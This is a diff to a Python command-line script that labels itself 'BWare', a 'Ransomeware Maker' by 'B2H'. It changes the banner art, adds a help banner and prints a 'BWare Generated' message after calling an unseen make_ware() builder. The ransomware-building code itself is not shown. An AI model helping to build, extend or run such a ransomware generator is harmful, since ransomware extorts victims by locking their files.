@@ -19,20 +19,15 @@ if len(sys.argv) > 1:
 else:
     os.system('clear')
     print('\033[92m'+'''
-            bbbbbbbbbbbbbbbbb   W    WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   W
-            bb              bb  WW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WW
-            bb               bb WWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWW
-            bb              bb  WWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWW
-            bb             bb   WWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWW
-            bbbbbbbbbbbbbbbb    WWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWW
-            bbbbbbbbbbbbbbbb    WWWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWWW
-            bb             bb   WWWWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWWWW
-            bb              bb  WWWWWWWWW   WWWWWW         WWWWWWWW   WWWWWWWWW
-            bb               bb WWWWWWWWWW   WWWW   WWWWW   WWWWWW   WWWWWWWWWW
-            bb              bb  WWWWWWWWWWW   WW   WWWWWWW   WWWW   WWWWWWWWWWW
-            bb             bb   WWWWWWWWWWWW      WWWWWWWWW   WW   WWWWWWWWWWWW
-            bbbbbbbbbbbbbbbb    WWWWWWWWWWWWW   WWWWWWWWWWWW      WWWWWWWWWWWWW
-
+                   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+                   ░     ░░░░░   ░░░░░░░░   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+                   ▒  ▒▒   ▒▒▒   ▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+                   ▒  ▒▒▒   ▒▒   ▒▒▒  ▒▒▒   ▒▒▒▒   ▒▒▒▒▒  ▒    ▒▒▒▒   ▒▒▒▒
+                   ▓      ▓▓▓▓   ▓▓   ▓▓▓   ▓▓   ▓▓   ▓▓▓   ▓▓▓▓▓  ▓▓▓   ▓
+                   ▓  ▓▓▓▓   ▓   ▓  ▓   ▓   ▓   ▓▓▓   ▓▓▓   ▓▓▓▓         ▓
+                   ▓  ▓▓▓▓▓  ▓  ▓  ▓▓▓▓     ▓   ▓▓▓   ▓▓▓   ▓▓▓▓  ▓▓▓▓▓▓▓▓
+                   █    █   ██   ████████   ███   █    █    ██████     ███
+                   ███████████████████████████████████████████████████████
     '''+'\033[0m')
     print('\033[93m'+'''
                                        Tool :- BWare
@@ -46,6 +41,10 @@ try:
         if sys.argv[2][-1]=='/':
             t_dir_t=sys.argv[2][:-1]
             make_ware(t_dir_t,sys.argv[4])
+            print(f'''\n         »»ᅳBWare Generatedᅳ►\n
+                            File name   :-  {sys.argv[4]}
+                            Path        :-  {sys.argv[4]}
+            ''')
         else:
             make_ware(sys.argv[2],sys.argv[4])
 except IndexError:
@@ -57,6 +56,23 @@ except IndexError:
 
 try:
     if sys.argv[1] == '-h' or sys.argv[1] == '-help' or sys.argv[1] == '--help':
+        print('\033[92m'+'''
+                       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+                       ░     ░░░░░   ░░░░░░░░   ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+                       ▒  ▒▒   ▒▒▒   ▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+                       ▒  ▒▒▒   ▒▒   ▒▒▒  ▒▒▒   ▒▒▒▒   ▒▒▒▒▒  ▒    ▒▒▒▒   ▒▒▒▒
+                       ▓      ▓▓▓▓   ▓▓   ▓▓▓   ▓▓   ▓▓   ▓▓▓   ▓▓▓▓▓  ▓▓▓   ▓
+                       ▓  ▓▓▓▓   ▓   ▓  ▓   ▓   ▓   ▓▓▓   ▓▓▓   ▓▓▓▓         ▓
+                       ▓  ▓▓▓▓▓  ▓  ▓  ▓▓▓▓     ▓   ▓▓▓   ▓▓▓   ▓▓▓▓  ▓▓▓▓▓▓▓▓
+                       █    █   ██   ████████   ███   █    █    ██████     ███
+                       ███████████████████████████████████████████████████████
+        '''+'\033[0m')
+        print('\033[93m'+'''
+                                           Tool :- BWare
+                                   Tool type :- Ransomeware Maker
+                                         Created by :- B2H
+                            B2H's github :- https://github.com/back-2-hack
+        '''+'\033[0m')
         print('''
     __________________________________________________________________________________________
     |                                                                                         |
